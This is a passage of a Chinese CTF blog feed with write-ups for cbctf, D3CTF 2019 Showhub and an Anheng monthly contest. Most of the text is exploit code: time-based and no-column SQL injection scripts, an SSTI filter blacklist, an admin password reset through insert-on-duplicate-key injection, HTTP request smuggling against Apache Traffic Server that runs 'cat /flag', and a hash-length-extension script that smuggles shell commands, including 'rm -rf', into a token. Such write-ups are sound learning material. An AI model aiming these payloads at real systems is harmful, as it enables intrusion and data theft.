flag&#123;0ur_daTaBase_1S_c001&#125;</span><span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    ppay=<span class="hljs-string">&quot;+,-./0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ`abcdefghijklmnopqrstuvwxyz&#123;|&#125;&quot;</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):        <span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;&quot;&quot;(case/*2*/when/*2*/&#123;&#125;&gt;/*2*/BINARY/*2*/&#123;&#125;/*2*/then/*2*/1/*2*/else/*2*/(SELECT/*2*/count(*)/*2*/FROM/*2*/user/*2*/A/*2*/inner/*2*/join/*2*/user/*2*/B/*2*/inner/*2*/join/*2*/user/*2*/C/*2*/inner/*2*/join/*2*/user/*2*/D/*2*/inner/*2*/join/*2*/user/*2*/E/*2*/inner/*2*/join/*2*/user/*2*/F/*2*/inner/*2*/join/*2*/user/*2*/G/*2*/inner/*2*/join/*2*/user/*2*/H/*2*/inner/*2*/join/*2*/user/*2*/i/*2*/inner/*2*/join/*2*/user/*2*/j/*2*/inner/*2*/join/*2*/user/*2*/k/*2*/inner/*2*/join/*2*/user/*2*/l/*2*/inner/*2*/join/*2*/user/*2*/m/*2*/inner/*2*/join/*2*/user/*2*/n/*2*/inner/*2*/join/*2*/mysql.help_relation/*2*/o/*2*/inner/*2*/join/*2*/mysql.help_relation/*2*/p)/*2*/end);%23&quot;&quot;&quot;</span>        pppay=<span class="hljs-string">&quot;0x&quot;</span>+str_to_hex(x+<span class="hljs-built_in">chr</span>(j)+<span class="hljs-string">&quot;~&quot;</span>)        before_time = time.time()        <span class="hljs-keyword">try</span>:            r = requests.post(url=url+<span class="hljs-built_in">str</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;(select/*2*/group_concat(`4`)/*2*/from/*2*/(select*from((select/*2*/1)b/*2*/join/*2*/(select/*2*/2)ab/*2*/join/*2*/(select/*2*/3)ac/*2*/join/*2*/(select/*2*/4)ad)/*2*/union/*2*/select/*2*/*/*2*/from/*2*/user)aa)&quot;</span>,pppay),timeout=<span class="hljs-number">6</span>)        <span class="hljs-keyword">except</span>:            <span class="hljs-keyword">pass</span>        after_time = time.time()        <span class="hljs-comment"># print( r.text)</span>        offset = after_time-before_time        print(offset,end=<span class="hljs-string">&quot; &quot;</span>)        print(x,end=<span class="hljs-string">&quot;&quot;</span>)        print(<span class="hljs-built_in">chr</span>(j))        <span class="hljs-keyword">if</span> (offset&gt;<span class="hljs-number">5</span>):            x=x+<span class="hljs-built_in">chr</span>(j)            print(x)            <span class="hljs-keyword">break</span></code></pre><h2 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h2><p>给了源码</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directoryapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span>(<span class="hljs-params">s</span>):</span>        blacklist = [<span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,                     <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;session&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;add&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;ord&#x27;</span>, <span class="hljs-string">&#x27;redirect&#x27;</span>, <span class="hljs-string">&#x27;url_for&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;builtin&#x27;</span>, <span class="hljs-string">&#x27;get_flashed_messages&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;form&#x27;</span>, <span class="hljs-string">&#x27;cookies&#x27;</span>, <span class="hljs-string">&#x27;headers&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>]        flag = <span class="hljs-literal">True</span>        <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:            <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> s.lower():                flag = <span class="hljs-literal">False</span>                <span class="hljs-keyword">break</span>        <span class="hljs-keyword">return</span> flag    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>):        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()    <span class="hljs-keyword">elif</span> safe_jinja(request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)):        name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>)    <span class="hljs-keyword">else</span>:        name = <span class="hljs-string">&#x27;wendell&#x27;</span>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string"></span><span class="hljs-string">    &lt;div class=&quot;center-content&quot;&gt;</span><span class="hljs-string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span><span class="hljs-string">    &lt;/div&gt;</span><span class="hljs-string">    &lt;!--flag in /flag--&gt;</span><span class="hljs-string">    &lt;!--python3.8--&gt;</span><span class="hljs-string">&#x27;&#x27;&#x27;</span> % (name)    <span class="hljs-keyword">return</span> render_template_string(template)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)</code></pre><p>SSTI过滤了非常多的东西</p><p><a href="https://zhuanlan.zhihu.com/p/164896822">https://zhuanlan.zhihu.com/p/164896822</a></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="α层"><a href="#α层" class="headerlink" title="α层"></a>α层</h2><p>两张图片一叠，抄下y老师脚本</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Imagealpha = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;alpha.png&quot;</span>)flag = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flags.png&quot;</span>)new_img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, flag.size, (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(flag.size[<span class="hljs-number">0</span>]):    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(flag.size[<span class="hljs-number">1</span>]):        <span class="hljs-keyword">if</span> alpha.getpixel((i,j))[<span class="hljs-number">0</span>] != <span class="hljs-number">0</span>:            new_img.putpixel((i, j), flag.getpixel((i, j)))new_img.save(<span class="hljs-string">&quot;new.png&quot;</span>)</code></pre><h2 id="python2-人工智障"><a href="#python2-人工智障" class="headerlink" title="python2-人工智障"></a>python2-人工智障</h2><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;ls&quot;</span>)</code></pre><h2 id="我的二维码，时尚时尚最时尚"><a href="#我的二维码，时尚时尚最时尚" class="headerlink" title="我的二维码，时尚时尚最时尚"></a>我的二维码，时尚时尚最时尚</h2><p>binwalk 分出两张图片，然后异或</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cbctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[D3CTF 2019]Showhub</title>
    <link href="/2020/07/25/D3CTF-2019-Showhub/"/>
    <url>/2020/07/25/D3CTF-2019-Showhub/</url>
    
    <content type="html"><![CDATA[<h1 id="获取admin账户"><a href="#获取admin账户" class="headerlink" title="获取admin账户"></a>获取admin账户</h1><p>在源码中admin的密码可以解出来是123，(值buu上给出的代码)</p><p>还可以通过insert on duplicate key update 注入。</p><p><code>on duplicate key update</code> 的作用是当insert已经存在的记录时，执行Update，即我们再次注册admin，插入操作变为更新，可以利用这个修改密码，这里我修改为123456</p><pre><code class="hljs n1ql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-symbol">`users`</span>(<span class="hljs-symbol">`username`</span>,<span class="hljs-symbol">`password`</span>) <span class="hljs-keyword">VALUE</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>) <span class="hljs-keyword">ON</span> DUPLICATE <span class="hljs-keyword">KEY</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">0x6335366430653961376363656336376234656131333136353530333864363034</span></code></pre><p>再结合格式化字符串漏洞逃逸单引号闭合单引号构造payload</p><pre><code class="hljs 1c">admin%<span class="hljs-number">1</span>$&#x27;,0x60) ON DUPLICATE KEY UPDATE password=0x<span class="hljs-number">38643936396565</span><span class="hljs-number">66366563616433</span><span class="hljs-number">63323961336136</span><span class="hljs-number">32393238306536</span><span class="hljs-number">38366366306333</span><span class="hljs-number">66356435613836</span><span class="hljs-number">61666633636131</span><span class="hljs-number">32303230633932</span><span class="hljs-number">33616463366339</span>32#ps. 这里加密用的是sha256</code></pre><p>用这个作为用户名注册，密码任意，然后就可以用admin/123456登录了</p><h1 id="Http走私"><a href="#Http走私" class="headerlink" title="Http走私"></a>Http走私</h1><p>在返回的响应头中有<code>Server: ATS/7.1.2</code></p><p>Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器.<a href="https://paper.seebug.org/1048/#4-httpcve-2018-8004">CVE-2018-8004</a></p><p>可以利用CL-TE这种http走私(原理可以看这里<a href="https://paper.seebug.org/1048/#33-cl-te">https://paper.seebug.org/1048/#33-cl-te</a>)</p><p>开始构造，抓一个正常访问<code>WebConsole</code>的包，然后改为post包，加一个<code>Transfer-Encoding: chunked</code>头部，主体部分加个0 ，再复制一份粘贴到下面，如</p><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /WebConsole/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">78</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">78</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span>/Manage/<span class="hljs-attribute">Cookie</span>: gateone_user=<span class="hljs-string">&quot;2|1:0|10:1594909382|12:gateone_user|108:eyJ1cG4iOiAiQU5PTllNT1VTIiwgInNlc3Npb24iOiAiTXpVMll6TTVNalF3TjJGa05HWTVOV0UzTWpBM1pqTXhZV1EwTkRFeFlqRmpNIn0=|02ea18506b0117c00c482ea86f71e4216cb49f844bc510ce3ea3e761eec36357&quot;</span>; PHPSESSID=kmggf<span class="hljs-number">7</span>l<span class="hljs-number">580</span>q<span class="hljs-number">8</span>ack<span class="hljs-number">1</span>ptcd<span class="hljs-number">3</span>ri<span class="hljs-number">7</span>nd<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">789</span><span class="hljs-attribute">Transfer</span>-Encoding: chunked<span class="hljs-attribute">0</span><span class="hljs-attribute">POST</span> /WebConsole/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">78</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">78</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span>/Manage/<span class="hljs-attribute">Cookie</span>: gateone_user=<span class="hljs-string">&quot;2|1:0|10:1594909382|12:gateone_user|108:eyJ1cG4iOiAiQU5PTllNT1VTIiwgInNlc3Npb24iOiAiTXpVMll6TTVNalF3TjJGa05HWTVOV0UzTWpBM1pqTXhZV1EwTkRFeFlqRmpNIn0=|02ea18506b0117c00c482ea86f71e4216cb49f844bc510ce3ea3e761eec36357&quot;</span>; PHPSESSID=kmggf<span class="hljs-number">7</span>l<span class="hljs-number">580</span>q<span class="hljs-number">8</span>ack<span class="hljs-number">1</span>ptcd<span class="hljs-number">3</span>ri<span class="hljs-number">7</span>nd<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2</span><span class="hljs-attribute">0</span></code></pre><p>注意下面的<code>Content-Length</code> 要大于真实的数据长度，比如这里数据为0，真实长度为1，这里<code>Content-Length</code>我设置为2以上都有回显，1没回显。</p><p>然后把构造好的数据包放到instruder模块反复发包，就能看到返回包长度有特长的，就是我们想要的了，从上面这个payload里面可以得知<code>WebConsole</code>有个exec路由，post发cmd=想要执行的命令就会有回显，再构造一个http走私</p><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /WebConsole/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">78</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">78</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span>/Manage/<span class="hljs-attribute">Cookie</span>: gateone_user=<span class="hljs-string">&quot;2|1:0|10:1594909382|12:gateone_user|108:eyJ1cG4iOiAiQU5PTllNT1VTIiwgInNlc3Npb24iOiAiTXpVMll6TTVNalF3TjJGa05HWTVOV0UzTWpBM1pqTXhZV1EwTkRFeFlqRmpNIn0=|02ea18506b0117c00c482ea86f71e4216cb49f844bc510ce3ea3e761eec36357&quot;</span>; PHPSESSID=kmggf<span class="hljs-number">7</span>l<span class="hljs-number">580</span>q<span class="hljs-number">8</span>ack<span class="hljs-number">1</span>ptcd<span class="hljs-number">3</span>ri<span class="hljs-number">7</span>nd<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">789</span><span class="hljs-attribute">Transfer</span>-Encoding: chunked<span class="hljs-attribute">0</span><span class="hljs-attribute">POST</span> /WebConsole/exec HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">78</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">78</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://node<span class="hljs-number">3</span>.buuoj.cn:<span class="hljs-number">27172</span>/Manage/<span class="hljs-attribute">Cookie</span>: gateone_user=<span class="hljs-string">&quot;2|1:0|10:1594909382|12:gateone_user|108:eyJ1cG4iOiAiQU5PTllNT1VTIiwgInNlc3Npb24iOiAiTXpVMll6TTVNalF3TjJGa05HWTVOV0UzTWpBM1pqTXhZV1EwTkRFeFlqRmpNIn0=|02ea18506b0117c00c482ea86f71e4216cb49f844bc510ce3ea3e761eec36357&quot;</span>; PHPSESSID=kmggf<span class="hljs-number">7</span>l<span class="hljs-number">580</span>q<span class="hljs-number">8</span>ack<span class="hljs-number">1</span>ptcd<span class="hljs-number">3</span>ri<span class="hljs-number">7</span>nd<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">30</span><span class="hljs-attribute">cmd</span>=cat /flag;</code></pre><p>发包 flag到手</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>http走私</tag>
      
      <tag>insert on duplicate key update 注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安恒月赛7.25</title>
    <link href="/2020/07/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B7-25/"/>
    <url>/2020/07/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B7-25/</url>
    
    <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>文件包含+时间戳</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64files = base64.b64encode(<span class="hljs-string">&quot;ab/../../../../../../../../flag&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))fff=<span class="hljs-built_in">str</span>(files, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)print(fff)tt=<span class="hljs-built_in">int</span>(time.time())url=<span class="hljs-string">&quot;http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(tt,fff)print(url)print(requests.get(url).text)</code></pre><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>无列名注入</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp2</span>():</span>    str1 = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span>    flag = <span class="hljs-string">&#x27;&#x27;</span>    flag_table_name = <span class="hljs-string">&#x27;flllaaaggg&#x27;</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">39</span>):        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1:            i = flag+i            paylaod = <span class="hljs-string">&quot;?id=1&#x27;/((select/**/1,&#x27;&#123;&#125;~&#x27;)/**/&gt;/**/(select/**/*/**/from/**/&#123;&#125;))%23&quot;</span>.<span class="hljs-built_in">format</span>(i,flag_table_name)            <span class="hljs-comment">#print(paylaod)</span>            r = requests.post(url=<span class="hljs-string">&quot;http://183.129.189.60:10004/&quot;</span>+paylaod)            <span class="hljs-comment"># print(&quot;http://183.129.189.60:10004/&quot;+paylaod)</span>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Array&#x27;</span> <span class="hljs-keyword">in</span> r.text:                flag=i                print(flag)                <span class="hljs-keyword">break</span>exp2()<span class="hljs-comment"># payload.replace(&#x27; &#x27;,&#x27;/**/&#x27;)  这里利用了1/0进行注入</span></code></pre><p>或者直接联合注入查询</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">183.129</span>.<span class="hljs-number">189.60</span>:<span class="hljs-number">10004</span><span class="hljs-regexp">/?id=100’/</span>**<span class="hljs-regexp">/union/</span>**<span class="hljs-regexp">/select/</span>**<span class="hljs-regexp">/*,1/</span>**<span class="hljs-regexp">/from/</span>**/flllaaaggg%<span class="hljs-number">23</span></code></pre><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><code>/static/js/app.4d269ccff489d8a081d1.js</code>注释有</p><p><code>//# sourceMappingURL=app.4d269ccff489d8a081d1.js.map</code></p><p>访问后能下载，在文件中发现/api/upload/list能看到所有文件的id和token，发现第一个是源码</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">183.129.189.60:10010</span>/api/upload?token=eyJzaWduIjoiWmpneE<span class="hljs-number">5</span>tRTVaVFJoWldRNVpXUXpZemM<span class="hljs-number">1</span>TVRZMU<span class="hljs-number">56</span>a<span class="hljs-number">3</span>pZelE<span class="hljs-number">0</span>TlRRNVlqZz<span class="hljs-number">0</span>iLCJpZCI<span class="hljs-number">6</span>Ik<span class="hljs-number">1</span>qVmpZamd<span class="hljs-number">6</span>WVRZdFkyRXhZUzAwWlRnekxUazFaR<span class="hljs-number">0</span>V<span class="hljs-number">0</span>TW<span class="hljs-number">1</span>RelpEaGtZemhoWW<span class="hljs-number">1</span>ZNCJ<span class="hljs-number">9</span></code></pre><p>可以在压缩包里看到开发文档，储存的服务在storage_provider下，重点关注上传的源码，发现下载时id可注入命令，通过构造命令把结果写入文件下载，id在cookie里，验证可以用hash长度扩展攻击绕过，附上脚本</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><span class="hljs-comment"># -*- coding:utf8 -*-</span><span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashpumpy<span class="hljs-keyword">import</span> json<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> uuid<span class="hljs-keyword">import</span> requestshost = sys.argv[<span class="hljs-number">1</span>]port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])command = sys.argv[<span class="hljs-number">3</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploadTestFile</span>():</span>    r = requests.post(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload&quot;</span>,                      files=[(<span class="hljs-string">&#x27;file&#x27;</span>, (<span class="hljs-string">&#x27;testa.txt&#x27;</span>, <span class="hljs-string">&#x27;abcd&#x27;</span>))])    <span class="hljs-keyword">return</span> r.json()[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;token&#x27;</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rceToGetFile</span>(<span class="hljs-params">token</span>):</span>    filename = <span class="hljs-built_in">str</span>(uuid.uuid4())    data = json.loads(base64.b64decode(token))    <span class="hljs-built_in">id</span> = base64.b64decode(data[<span class="hljs-string">&#x27;id&#x27;</span>])    sign = base64.b64decode(data[<span class="hljs-string">&#x27;sign&#x27;</span>])    result = hashpumpy.hashpump(sign, <span class="hljs-built_in">id</span>,                                <span class="hljs-string">&#x27;;&#x27;</span> + command + <span class="hljs-string">&#x27; &gt;&gt; &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;zip &#x27;</span> + filename + <span class="hljs-string">&#x27;.zip &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;rm -rf &#x27;</span> + filename + <span class="hljs-string">&#x27;.txt;&#x27;</span>,                                <span class="hljs-number">32</span>)    data[<span class="hljs-string">&#x27;id&#x27;</span>] = base64.b64encode(result[<span class="hljs-number">1</span>]).decode()    data[<span class="hljs-string">&#x27;sign&#x27;</span>] = base64.b64encode(result[<span class="hljs-number">0</span>].encode()).decode()    token = base64.b64encode(json.dumps(data).encode())    <span class="hljs-keyword">try</span>:        requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload&quot;</span>, params=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;, timeout=<span class="hljs-number">5</span>)    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">pass</span>    <span class="hljs-keyword">return</span> filename<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getTargetFileToken</span>(<span class="hljs-params">filename</span>):</span>    r = requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload/list&quot;</span>)    data = r.json()[<span class="hljs-string">&#x27;data&#x27;</span>]    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data:        <span class="hljs-keyword">if</span> item[<span class="hljs-string">&#x27;id&#x27;</span>] == filename:            <span class="hljs-keyword">return</span> item[<span class="hljs-string">&#x27;token&#x27;</span>]    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params">token</span>):</span>    r = requests.get(<span class="hljs-string">&quot;http://&quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;/api/upload&quot;</span>, params=&#123;<span class="hljs-string">&#x27;token&#x27;</span>: token&#125;)    origin_text = r.text    <span class="hljs-keyword">return</span> origin_text<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    print(<span class="hljs-string">&quot;[*]上传测试文件，获取 Token 中....&quot;</span>)    token = uploadTestFile()    print(<span class="hljs-string">&quot;[+]Token:&quot;</span> + token)    print(<span 